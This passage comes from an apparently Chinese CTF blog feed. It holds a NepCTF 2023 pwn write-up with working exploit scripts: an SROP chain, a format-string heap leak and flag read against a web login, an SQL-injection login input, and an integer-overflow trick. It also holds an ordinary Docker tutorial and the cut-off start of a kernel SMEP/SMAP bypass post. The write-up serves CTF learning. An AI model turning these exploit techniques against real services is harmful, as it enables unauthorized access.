class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>,<span class="number">30523</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># db(&#x27;0x04007AD&#x27;)</span></span><br><span class="line">buffer=elf.bss()</span><br><span class="line"><span class="comment"># 0x0000000000400813 : pop rdi ; ret</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400813</span></span><br><span class="line">syscall=elf.sym[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">readpaylaod = SigreturnFrame()</span><br><span class="line">readpaylaod.rdi=<span class="number">0</span></span><br><span class="line">readpaylaod.rsi=<span class="number">0</span></span><br><span class="line">readpaylaod.rdx=buffer</span><br><span class="line">readpaylaod.rcx=<span class="number">0x1000</span></span><br><span class="line">readpaylaod.rip=syscall</span><br><span class="line">readpaylaod.rsp =buffer+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">ropopen=SigreturnFrame()</span><br><span class="line">ropopen.rdi=<span class="number">2</span></span><br><span class="line">ropopen.rsi=buffer</span><br><span class="line">ropopen.rip=syscall</span><br><span class="line">ropopen.rsp =buffer+<span class="number">8</span>+<span class="built_in">len</span>(<span class="built_in">bytes</span>(readpaylaod))+<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">ropread=SigreturnFrame()</span><br><span class="line">ropread.rdi=<span class="number">0</span></span><br><span class="line">ropread.rsi=<span class="number">3</span></span><br><span class="line">ropread.rdx=buffer+<span class="number">0x100</span></span><br><span class="line">ropread.rcx=<span class="number">0x50</span></span><br><span class="line">ropread.rip=syscall</span><br><span class="line">ropread.rsp = buffer+<span class="number">8</span>+<span class="built_in">len</span>(<span class="built_in">bytes</span>(readpaylaod))*<span class="number">2</span>+<span class="number">0x18</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">ropwrite=SigreturnFrame()</span><br><span class="line">ropwrite.rdi=<span class="number">1</span></span><br><span class="line">ropwrite.rsi=<span class="number">1</span></span><br><span class="line">ropwrite.rdx=buffer+<span class="number">0x100</span></span><br><span class="line">ropwrite.rcx=<span class="number">0x50</span></span><br><span class="line">ropwrite.rip=syscall</span><br><span class="line">ropwrite.rsp =buffer+<span class="number">8</span>+<span class="built_in">len</span>(<span class="built_in">bytes</span>(readpaylaod))*<span class="number">3</span>+<span class="number">0x18</span>*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line">    padding,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(readpaylaod)</span><br><span class="line">)</span><br><span class="line">sa(<span class="string">b&#x27;welcome to NepCTF2023!&#x27;</span>,payload)</span><br><span class="line">paylaod=flat(</span><br><span class="line">    <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(ropopen),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(ropread),</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0xf</span>,</span><br><span class="line">    syscall,</span><br><span class="line">    <span class="built_in">bytes</span>(ropwrite),</span><br><span class="line">)</span><br><span class="line">s(paylaod)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230817135721077.png" alt="image-20230817135721077"></p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>访问网站，随便登录进去，看一下网页源码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function listFiles() &#123;</span><br><span class="line">      $.get(&quot;/list_files/&quot;, function(data)&#123;</span><br><span class="line">          $(&quot;#file-list&quot;).html(data);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function viewFile(filename) &#123;</span><br><span class="line">      window.location = &#x27;/view_file/&#x27; + filename;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>尝试&#x2F;list_files&#x2F;拼接&#x2F;后可以下载得到文件，下载login分析</p><p><img src="/2023/08/17/2023NepCTF/image-20230818175023327.png" alt="image-20230818175023327"></p><p>flag读到了堆上</p><p>这里a3是url上地址，a4是请求方式</p><p><img src="/2023/08/17/2023NepCTF/image-20230818170424353.png" alt="image-20230818170424353"></p><p>查看dockerfile后发现需要搭建环境还需要一些库文件</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./libmicrohttpd.so.12 /home/ctf/lib/x86_64-linux-gnu/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ld-linux-x86-64.so.2 /home/ctf/lib64</span></span><br></pre></td></tr></table></figure><p>利用&#x2F;view_file&#x2F;拼接绝对路径下载下来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view_file//lib/x86_64-linux-gnu/libmicrohttpd.so.12</span><br><span class="line">/view_file//lib64/ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230818175743836.png" alt="image-20230818175743836"></p><p>docker搭建起来环境后，调试</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/n/login&gt; ps -ef | grep &#x27;login&#x27;</span><br><span class="line">root       52101   52067 91 16:16 ?        01:38:10 ./login</span><br><span class="line">sudo gdb attach 52101</span><br></pre></td></tr></table></figure><p>登录时dest可控，sprintf有格式化字符串漏洞，后面会输出名字，直接断点断到sprint泄露堆地址，找到flag地址，利用%s写入到v49即可</p><p><img src="/2023/08/17/2023NepCTF/image-20230818193423236.png" alt="image-20230818193423236"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://192.168.70.134:32774/login&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Edg/100.0.1185.29&quot;</span>&#125;</span><br><span class="line">params = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;%15059$p&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url=url,headers=headers, params=params)</span><br><span class="line">heapad = <span class="built_in">int</span>(re.findall(<span class="string">r&#x27;0x([0-9a-fA-F]+)&#x27;</span>, response.text)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapad))</span><br><span class="line">flagad=heapad-<span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">params = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">b&#x27;%36$saaa&#x27;</span>+p64(flagad)&#125;</span><br><span class="line">response= requests.get(url=url, headers=headers,params=params)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230818194536343.png" alt="image-20230818194536343"></p><h2 id="HRP-CHAT"><a href="#HRP-CHAT" class="headerlink" title="HRP-CHAT"></a>HRP-CHAT</h2><h3 id="one"><a href="#one" class="headerlink" title="one"></a>one</h3><p>就根据open flag文件得字符串来定位漏洞</p><p><img src="/2023/08/17/2023NepCTF/image-20230819001326863.png" alt="image-20230819001326863"></p><p>第一个漏洞是在服务端Shop查询时,当用户存在且是root权限时会打开flag并发送给我们客户端，明显的sql注入 –注释掉后面的sql语句即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v51, <span class="string">&quot;999&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(s, <span class="string">&quot;select * from user where Username=&#x27;%s&#x27; and Statement =&#x27;root&#x27;&quot;</span>, v39 + <span class="number">856</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n\n%s\n&quot;</span>, s);</span><br><span class="line">      v21 = <span class="number">0</span>;</span><br><span class="line">      v22 = <span class="number">0</span>;</span><br><span class="line">      rc = sqlite3_get_table(db, s, v36, &amp;v21, &amp;v22, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v21 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v54[<span class="number">0</span>] = <span class="string">&#x27;\xE4\x85\xBB\xE4galf&#x27;</span>;</span><br><span class="line">        v54[<span class="number">1</span>] = <span class="string">&#x27;\x94\xE7toor\x9B\xBE&#x27;</span>;</span><br><span class="line">        LODWORD(v55) = <span class="number">-1215764824</span>;</span><br><span class="line">        BYTE4(v55) = <span class="number">0</span>;</span><br><span class="line">        send(*((_QWORD *)v39 + <span class="number">2</span>), buf, <span class="number">0x630</span>uLL, <span class="number">0</span>);</span><br><span class="line">        pthread_mutex_unlock(&amp;phead);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        stream = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_ONE&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Login</span><br><span class="line">12</span><br><span class="line">jk</span><br><span class="line">Login</span><br><span class="line">12&#x27;--</span><br><span class="line">jk</span><br><span class="line">Shop</span><br><span class="line">999</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230819003924199.png" alt="image-20230819003924199"></p><h3 id="three"><a href="#three" class="headerlink" title="three"></a>three</h3><p>start战斗时只要v33&lt;&#x3D;0即可,dword_55F4474AADD8是int类型且为99999999加上H3h3QAQ的技能伤害就可以溢出为负数，刚开始没有H3h3QAQ卡牌，可以通过抽卡获得</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(*(<span class="type">const</span> <span class="type">char</span> **)&amp;v39[<span class="number">8</span> * v31 + <span class="number">48</span>], (<span class="type">const</span> <span class="type">char</span> *)&amp;cNode[<span class="number">20</span> * m])</span><br><span class="line">            &amp;&amp; v32 &lt;= <span class="number">1</span></span><br><span class="line">            &amp;&amp; v31 &gt;= <span class="number">0</span></span><br><span class="line">            &amp;&amp; v31 &lt;= *((_QWORD *)v39 + <span class="number">106</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v33 = dword_55F4474AADD8 + cNode[<span class="number">20</span> * m + <span class="number">16</span> + (<span class="type">int</span>)v32];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hurt:%d\n&quot;</span>, v33);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">int</span>)v33 &lt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v46 = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_THREE&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">              <span class="keyword">if</span> ( !v46 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Could not open flag file.&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/2023NepCTF/image-20230819151208900.png" alt="image-20230819151208900"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2023/08/17/docker/"/>
      <url>/2023/08/17/docker/</url>
      
        <content type="html"><![CDATA[<p>docker最早接触是之前学渗透时，零零散散学过一点(指简单拉了个靶场镜像，run一下😂)，不过也忘得差不多了</p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a><a href="https://docs.docker.com/">Docker</a></h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Ubuntu安装docker：</p><p><a href="https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository">https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ca-certificates curl gnupg</span><br><span class="line"></span><br><span class="line">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="line">sudo chmod a+r /etc/apt/keyrings/docker.gpg</span><br><span class="line"></span><br><span class="line">echo \</span><br><span class="line">  &quot;deb [arch=&quot;$(dpkg --print-architecture)&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span><br><span class="line">  &quot;$(. /etc/os-release &amp;&amp; echo &quot;$VERSION_CODENAME&quot;)&quot; stable&quot; | \</span><br><span class="line">  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure><p>创建并加入docker用户组(不然只能root用户)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable docker</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure><h3 id="配置镜像加速器"><a href="#配置镜像加速器" class="headerlink" title="配置镜像加速器"></a>配置镜像加速器</h3><h3 id="镜像加速源"><a href="#镜像加速源" class="headerlink" title="镜像加速源"></a>镜像加速源</h3><p><strong>&#x2F;etc&#x2F;docker&#x2F;daemon.json</strong> 里写下 ps:个人感觉阿里云好用点</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;加速地址&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;加速地址&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>重启docker服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>docker info看到下面即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Registry Mirrors:</span><br><span class="line">加速地址</span><br></pre></td></tr></table></figure><h2 id="Docker中的三个重要概念"><a href="#Docker中的三个重要概念" class="headerlink" title="Docker中的三个重要概念"></a>Docker中的三个重要概念</h2><ul><li>Image（镜像）</li><li>Container（容器）</li><li>Repository（仓储）</li></ul><h4 id="Image（镜像）"><a href="#Image（镜像）" class="headerlink" title="Image（镜像）"></a>Image（镜像）</h4><p>一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，镜像构建时，会一层层构建，在构建之后不会被改变</p><h4 id="Container（容器）"><a href="#Container（容器）" class="headerlink" title="Container（容器）"></a>Container（容器）</h4><p><strong>容器是镜像运行时的实体</strong>，通过一个镜像，我们可以创建许多个不同的容器，每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为 <strong>容器存储层</strong>。容器器消亡时，容器存储层也随之消亡。</p><h4 id="Repository（仓库）"><a href="#Repository（仓库）" class="headerlink" title="Repository（仓库）"></a>Repository（仓库）</h4><p>集中的存储、分发镜像的服务，类似于github的代码仓库</p><p><a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p><code>&lt;仓库名&gt;:&lt;标签&gt;</code> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <code>latest</code> 作为默认标签。</p><h2 id="Docker基础命令"><a href="#Docker基础命令" class="headerlink" title="Docker基础命令"></a>Docker基础命令</h2><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><p><code>docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]</code>获取镜像</p><ul><li>Docker Registry默认地址是 Docker Hub(<code>docker.io</code>)。</li><li>仓库名是两段式名称，即 <code>&lt;用户名&gt;/&lt;软件名&gt;</code>。对于 Docker Hub，如果不给出用户名，则默认为 <code>library</code></li></ul><p><code>docker image ls</code> 列出镜像 </p><p><code>docker system df</code> 查看镜像、容器、数据卷所占用的空间 </p><p><code>docker image rm [选项] &lt;镜像1&gt; [&lt;镜像2&gt; ...] </code>删除镜像 </p><ul><li><code>docker image rm $(docker image ls -q redis)</code> 配合使用删除所有仓库名为redis的镜像</li></ul><p><code>docker commit [选项] &lt;容器ID或容器名&gt; [&lt;新镜像名&gt;[:&lt;标签&gt;]]</code> 保持修改过存储层的容器为新的镜像 <strong>慎用,可能会修改很多层的东西，导致镜像臃肿</strong></p><p><code>docker build [选项] &lt;上下文路径/URL/-&gt;</code>  </p><ul><li><p>-t 指定镜像名称 name:tag</p></li><li><p><code>docker build</code> 命令会将上下文路径目录下的内容打包交给 Docker 引擎以帮助构建镜像</p></li><li><p>-f 可以手动指定dockerfile</p></li></ul><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p><code>docker ps</code> 或者<code>docker container ls</code>查看当前运行中的容器</p><p><code>docker run</code> 启动新容器</p><ul><li><code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开。</li><li><code>-d</code> 容器以后台的方式运行 执行成功后，会返回一个容器 ID</li><li>&#96;&#96;-p local:container&#96; 把容器端口containe映射到主机端口local</li></ul><p><code>docker container start</code> 将终止（<code>exited</code>）的容器启动运行，而不是创建一个新容器</p><p><code>docker container stop</code> 终止一个运行中的容器</p><p><code>docker container restart</code> 重启一个正在运行的容器</p><p><code>docker container rm</code> 来删除一个处于终止状态的容器</p><p><code>docker container prune</code>来删除所有处于终止状态的容器</p><p><code>docker network ls</code> 查看网络列表</p><p><code>docker exec</code> </p><ul><li>docker exec -it [container ID or NAMES] 进入到已运行的 Docker 容器</li></ul><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a><a href="https://docs.docker.com/engine/reference/builder/">Dockerfile</a></h2><p>用来构建Docker镜像的构建文件，Dockerfile 中每一个指令都会建立一层 </p><p><code>FROM</code> 基础镜像(latest作为默认标签)</p><ul><li>FROM scratch 意味着你不以任何镜像为基础 比如一些静态编译的程序不需要什么支持</li></ul><p><code>RUN</code> 容器构建时需要运行的命令</p><ul><li>RUN &lt;命令&gt;</li><li>RUN [“可执行文件”, “参数1”, “参数2”]</li></ul><blockquote><p>由于Dockerfile中每一个指令都会建立一层(构建的过程就是RUN启动容器，执行这条指令后commit一下)，所以能一层完成的尽量用&amp;&amp;连接多个命令，每一层构建完成后删除不必要的东西，来减少容器大小</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:stretch</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">set</span> -x; buildDeps=<span class="string">&#x27;gcc libc6-dev make wget&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y <span class="variable">$buildDeps</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mkdir</span> -p /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make -C /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; make -C /usr/src/redis install \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/* \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> redis.tar.gz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -r /usr/src/redis \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get purge -y --auto-remove <span class="variable">$buildDeps</span></span></span><br></pre></td></tr></table></figure></blockquote><p><code>COPY</code> 从构建上下文目录中 <code>&lt;源路径&gt;</code> 的文件&#x2F;目录复制到新的一层的镜像内的 <code>&lt;目标路径&gt;</code> 位置</p><ul><li>COPY [–chown&#x3D;<user>:<group>] &lt;源路径&gt;… &lt;目标路径&gt;</group></user></li><li><code>&lt;源路径&gt;</code> 可以是多个，<code>&lt;目标路径&gt;</code>可以是容器内的绝对路径，也可以是相对于工作目录的相对路径</li><li><code>--chown=&lt;user&gt;:&lt;group&gt;</code>来改变文件的所属用户及所属组</li></ul><p><code>ADD</code>  相比于<code>COPY</code>多了压缩文件自动解压，URL自动下载</p><p><code>CMD</code>  容器启动命令，指定容器启动程序及参数</p><ul><li>shell<code> 格式：</code>CMD &lt;命令&gt;</li><li>exec<code> 格式：</code>CMD [“可执行文件”, “参数1”, “参数2”…]</li><li>shell格式的CMD echo $HOME执行时会变为CMD[ “sh”, “-c”, “echo $HOME” ]</li></ul><p><code>ENTRYPOINT</code> 指令格式和目的和<code>CMD</code>一样</p><ul><li><a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/entrypoint">https://yeasy.gitbook.io/docker_practice/image/dockerfile/entrypoint</a></li></ul><p><code>ENV</code>  设置环境变量，后面的其它指令可以使用此变量，和shell下行为一致</p><ul><li>ENV <key1>&#x3D;<value1> <key2>&#x3D;<value2>…</value2></key2></value1></key1></li></ul><p><code>ARG</code> 设置的构建环境的环境变量，在将来容器运行时是不会存在这些环境变量的</p><ul><li>ARG &lt;参数名&gt;[&#x3D;&lt;默认值&gt;]</li><li>docker build –build-arg &lt;参数名&gt;&#x3D;&lt;值&gt;可以来覆盖值</li></ul><p><code>VOLUME</code> 定义匿名卷，用于数据保存和持久化工作</p><ul><li>VOLUME [“&lt;路径1&gt;”, “&lt;路径2&gt;”…]</li></ul><p><code>EXPOSE</code> 仅仅是声明容器打算使用什么端口</p><ul><li>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;…]</li></ul><p><code>WORKDIR</code> 指定工作目录，以后各层的当前目录就被改为指定的目录</p><ul><li>WORKDIR &lt;工作目录路径&gt;</li></ul><p><code>USER</code> 指定当前用户</p><ul><li>USER &lt;用户名&gt;[:&lt;用户组&gt;]</li><li>改变环境状态并影响以后的层</li><li>用户必须是提前建立好的</li></ul><p><code>HEALTHCHECK</code> 健康检测</p><p><code>ONBUILD</code>  后面的指令在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像，去构建下一级镜像的时候才会被执行</p><ul><li>ONBUILD &lt;其它指令&gt;</li></ul><p><code>LABEL</code> 给镜像以键值对的形式添加一些元数据</p><ul><li>LABEL &lt;key&gt;&#x3D;&lt;value&gt; &lt;key&gt;&#x3D;&lt;value&gt; &lt;key&gt;&#x3D;&lt;value&gt; …</li></ul><p><code>SHELL</code>  指定 <code>RUN</code> <code>ENTRYPOINT</code> <code>CMD</code> 指令的 shell</p><ul><li>SHELL [“executable”, “parameters”]</li></ul><h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p>一个项目可以由多个服务（容器）关联而成，<code>Compose</code> 面向项目进行管理</p><p>安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Ubuntu22:/home/grxer# sudo curl -L https://github.com/docker/compose/releases/download/v2.20.3/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_">  % </span><span class="language-bash">Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">100 56.6M  100 56.6M    0     0  12.3M      0  0:00:04  0:00:04 --:--:-- 14.1M</span><br><span class="line">root@Ubuntu22:/home/grxer# sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line">root@Ubuntu22:/home/grxer# docker-compose --version</span><br><span class="line">Docker Compose version v2.20.3x</span><br></pre></td></tr></table></figure><p><a href="https://yeasy.gitbook.io/docker_practice/compose/commands">命令</a></p><p><a href="https://yeasy.gitbook.io/docker_practice/compose/compose_file">docker-compose.yml</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://yeasy.gitbook.io/docker_practice">https://yeasy.gitbook.io/docker_practice</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Bypass smep smap</title>
      <link href="/2023/08/16/kernel-bypass-smep/"/>
      <url>/2023/08/16/kernel-bypass-smep/</url>
      
        <content type="html"><![CDATA[<p>k</p><p><img src="/2023/08/16/kernel-bypass-smep/image-20230816220503539.png" alt="image-20230816220503539"></p><p>把cr4 20，21位指令即可，一般置为0x6f0,cr4可以直接用mov操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov cr4,0x6f0</span><br></pre></td></tr></table></figure><p>vmlinux里找些操作cr4的gadget利用</p><h2 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h2><p>开启下semp，smap保护</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./core.cpio \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">     -cpu qemu64-v1,+smep,+smap \</span><br><span class="line">    -s \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ $ 